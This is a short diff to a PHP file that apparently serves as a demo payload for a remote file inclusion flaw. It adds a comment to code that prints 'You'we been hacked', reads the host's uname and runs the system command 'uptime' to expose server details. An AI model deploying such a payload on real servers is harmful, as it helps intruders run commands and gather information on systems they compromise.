@@ -1,4 +1,5 @@
 <?php
+	/* We display a bunch of informations that an hacker can get if the remote file inclusion is possible */
 	echo "You'we been hacked Hahaha<br/>";
 	$hack1 = @php_uname();
 	$hack2 = system(uptime);
